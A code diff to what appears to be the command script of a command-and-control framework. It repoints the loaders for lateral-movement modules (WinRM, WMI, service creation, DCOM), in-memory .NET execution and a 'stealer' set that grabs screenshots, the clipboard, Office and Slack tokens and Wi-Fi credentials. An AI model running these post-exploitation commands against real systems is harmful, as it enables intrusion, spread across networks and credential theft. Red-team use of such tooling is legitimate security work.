@@ -12,7 +12,7 @@ cmd_rmt_exec_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     let password = parsed_json["password"] || ""; 
     
     let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr", [target, command, username, password]);
-    let bof_path   = ax.script_dir() + "BOF/LateralMov/WinRM/jump-winrm." + ax.arch(id) + ".o";
+    let bof_path   = ax.script_dir() + "bofs/dist/winrm_wsmanapi." + ax.arch(id) + ".o";
     let message    = "Task: remote exec winrm -> " + target + " " + command;
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
@@ -32,7 +32,7 @@ cmd_rmt_exec_wmi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
         parsed_json["target"], full_cmdline, is_current, parsed_json["domain"] || "", 
         parsed_json["username"] || "", parsed_json["password"] || ""
     ]);
-    let bof_path = ax.script_dir() + "BOF/LateralMov/WMI/jump-wmi." + ax.arch(id) + ".o";
+    let bof_path = ax.script_dir() + "bofs/dist/wmi_win32_process_create." + ax.arch(id) + ".o";
     let message  = "Task: remote exec wmi -> " + parsed_json["target"] + " " + full_cmdline;
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
@@ -51,7 +51,7 @@ cmd_rmt_exec_scm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
         bof_params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["target"], parsed_json["svc_name"], parsed_json["svc_path"]]);
     }
     
-    let bof_path   = ax.script_dir() + "BOF/LateralMov/SCM/jump-scm." + ax.arch(id) + ".o";
+    let bof_path   = ax.script_dir() + "bofs/lateralmov/scm_create_service." + ax.arch(id) + ".o";
     let message    = "Task: remote exec scm -> " + parsed_json["target"] + " " + parsed_json["svc_name"] + " " + parsed_json["svc_path"];
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
@@ -75,7 +75,7 @@ cmd_rmt_exec_dcom.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
         parsed_json["domain"] || ""
     ]);
     
-    let bof_path = ax.script_dir() + "BOF/LateralMov/DCOM/jump-dcom_mmc_execshell." + ax.arch(id) + ".o";
+    let bof_path = ax.script_dir() + "bofs/dist/dcom_mmc_execshell." + ax.arch(id) + ".o";
     let message = "Task: remote exec dcom -> " + (parsed_json["method"] || "MMC20.ExecuteShellCommand");
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
@@ -87,7 +87,7 @@ cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_
 
 let cmd_dotnet_list_v = ax.create_command("listversions", "Enumerate installed .NET Framework versions using BOF", "dotnet listversions", "Task: enumerate .NET versions");
 cmd_dotnet_list_v.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let bof_path = ax.script_dir() + "BOF/Dotnet/Bin/list_versions." + ax.arch(id) + ".o";
+    let bof_path = ax.script_dir() + "bofs/dist/list_versions." + ax.arch(id) + ".o";
     let message = "Task: enumerating installed .NET Framework versions";
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
@@ -105,7 +105,7 @@ cmd_dotnet_inline.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
     let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";
 
     let mod_params = ax.bof_pack("wstr,wstr,wstr,bytes", [args, app_domain, dotnet_version, dotnet_file]);
-    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/Bin/dotnet_assembly." + ax.arch(id) + ".bin";
+    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/bin/dotnet_assembly." + ax.arch(id) + ".bin";
     let message = `Task: executing .NET assembly in-memory`;
 
     ax.execute_alias(id, cmdline, `execute postex --file ${mod_path} --args ${mod_params}`, message);
@@ -126,8 +126,8 @@ cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
     let app_domain = parsed_json["app_domain"] || "RndDomain";
     let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";
 
-    let mod_params = ax.bof_pack("bytes,wstr,wstr,wstr", [dotnet_file, args, app_domain, dotnet_version]);
-    let mod_path = ax.script_dir() + "Shellcode/Dotnet/Bin/dotnet_assembly." + ax.arch(id) + ".bin";
+    let mod_params = ax.bof_pack("wstr,wstr,wstr,bytes", [args, app_domain, dotnet_version, dotnet_file]);
+    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/bin/dotnet_assembly." + ax.arch(id) + ".bin";
     let message = `Task: executing .NET assembly in-memory`;
 
     ax.execute_alias(id, cmdline, `execute postex --method ${method} --pid ${fork_pid} --file ${mod_path} --args ${mod_params}`, message);
@@ -136,12 +136,11 @@ cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 let cmd_dotnet = ax.create_command("dotnet", ".NET Framework operations - execute assemblies and enumerate versions");
 cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline, cmd_dotnet_fork]);
 
-
 // STEALER
 
 let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
 cmd_stealer_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let bof_path = ax.script_dir() + "BOF/Screenshot/Bin/screenshot." + ax.arch(id) + ".o";
+    let bof_path = ax.script_dir() + "bofs/dist/screenshot." + ax.arch(id) + ".o";
     let message = "Task: capture screenshot";
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
@@ -149,7 +148,7 @@ cmd_stealer_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_
 
 let cmd_stealer_clipdump = ax.create_command("clipdump", "Retrieve current clipboard contents", "stealer clipdump", "Task: dump clipboard data");
 cmd_stealer_clipdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let bof_path = ax.script_dir() + "BOF/Clipdump/Bin/clipdump." + ax.arch(id) + ".o";
+    let bof_path = ax.script_dir() + "bofs/dist/clipdump." + ax.arch(id) + ".o";
     let message = "Task: Dump clipboard from current user";
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
@@ -161,7 +160,7 @@ cmd_stealer_officedump.setPreHook(function (id, cmdline, parsed_json, ...parsed_
     let office_pid = parsed_json["office_pid"];
 
     let bof_params = ax.bof_pack("int", [office_pid]);
-    let bof_path =  ax.script_dir() + "BOF/Officedump/Bin/office-dump." + ax.arch(id) + ".o";
+    let bof_path =  ax.script_dir() + "bofs/dist/office-dump." + ax.arch(id) + ".o";
     let message = `Task: dump office token from ${office_pid}`;
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
@@ -173,7 +172,7 @@ cmd_stealer_slackdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_l
     let slack_pid = parsed_json["slack_pid"];
 
     let bof_params = ax.bof_pack("int", [slack_pid]);
-    let bof_path =  ax.script_dir() + "BOF/Slackdump/Bin/slack-dump." + ax.arch(id) + ".o";
+    let bof_path =  ax.script_dir() + "bofs/dist/slack-dump." + ax.arch(id) + ".o";
     let message = `Task: dump slack token from ${slack_pid}`;
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
@@ -185,7 +184,7 @@ cmd_stealer_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     let slack_pid = parsed_json["slack_pid"];
 
     let bof_params = ax.bof_pack("int", [slack_pid]);
-    let bof_path =  ax.script_dir() + "BOF/Wifidump/Bin/wifidump." + ax.arch(id) + ".o";
+    let bof_path =  ax.script_dir() + "bofs/dist/wifidump." + ax.arch(id) + ".o";
     let message = `Task: interact with wifi`;
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
